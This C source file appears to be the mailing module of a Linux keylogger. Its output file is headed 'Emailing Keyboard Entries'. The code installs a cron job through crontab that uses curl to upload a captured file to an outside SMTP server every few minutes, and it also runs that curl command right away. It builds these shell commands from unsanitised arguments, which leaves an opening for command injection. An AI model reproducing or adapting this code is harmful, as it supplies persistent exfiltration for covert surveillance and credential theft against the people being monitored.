#include "curl_smtp.h"

void curl_mail(int argc, char **argv){

char curl_buffer[2048];
char curl_buffer_log[2048];
char url[256] = "";
char user[256] = "";
char mail_from[256] = "";
char mail_rcpt[256] = "";
char smtp_file[256];
char time[24] = "";
char curl_path_log[50] = " > /var/log/curl_smtp.log 2>&1";

for (int arg = 0; arg < argc; arg++) {

  if ( (strcmp(argv[arg], "--smtp-url") ) == 0 ) {
     arg++;
     strncat(url, argv[arg], 250);
    }
    if ( (strcmp(argv[arg], "--pass") ) == 0) {
      arg++;
      strncat(user, argv[arg], 250);
    }
    if ( (strcmp(argv[arg], "--mail-from") ) == 0) {
      arg++;
      strncat(mail_from, argv[arg], 250);
    }
    if ( (strcmp(argv[arg], "--mail-rcpt") ) == 0) {
      arg++;
      strncat(mail_rcpt, argv[arg], 250);
    }
    if ( (strcmp(argv[arg], "--smtp-file") ) == 0) {
      arg++;
      strcpy(outfile, argv[arg]);
      strncat(smtp_file, argv[arg], 250);
    }
    if ( (strcmp(argv[arg], "--time") ) == 0) {
      arg++;
          if ( (atoi(argv[arg]) >= 1) && (atoi(argv[arg]) <= 60) ) {
                strncat(time, argv[arg], 99);
          } else {
            system("clear");
                printf("Error Time Incorrect: %s\nExemple: --time 1-60 Minutes \n", argv[arg]);
            exit(1);
        }
    }
}

snprintf(curl_buffer, sizeof(curl_buffer), "*/%s * * * * curl --url '%s' --mail-from '%s' --mail-rcpt '%s' --upload-file %s --user '%s:%s'\n", time, url, mail_from, mail_rcpt, smtp_file, mail_from, user);
snprintf(curl_buffer_log, sizeof(curl_buffer_log), "curl --url '%s' --mail-from '%s' --mail-rcpt '%s' --upload-file %s --user '%s:%s'",url, mail_from, mail_rcpt, smtp_file, mail_from, user);

filesmtp = fopen(smtp_conf, "w");
fprintf(filesmtp, "●  Emailing Keyboard Entries\n\n");
fprintf(filesmtp, "        SMTP Server:  %s\n", url);
fprintf(filesmtp, "       Source Email:  %s\n", mail_from);
fprintf(filesmtp, "  Destination Email:  %s\n", mail_rcpt);
fprintf(filesmtp, "        Update Time:  %s Minutes\n", time);
fprintf(filesmtp, "           Cron Job:  Yes\n");
fprintf(filesmtp, "            Logging:  /var/log/curl_smtp.log\n");
fclose(filesmtp);

if( (fd_cron = fopen(cron_file, "w") ) != NULL) {
    fprintf(fd_cron, curl_buffer);
    fclose(fd_cron);
} else {
    perror("Error: ");
}

chown(cron_file, 0, 108);
system("crontab -u cronjob /var/spool/cron/cronjob");
strncat(curl_buffer_log, curl_path_log, 50);
system(curl_buffer_log);
}
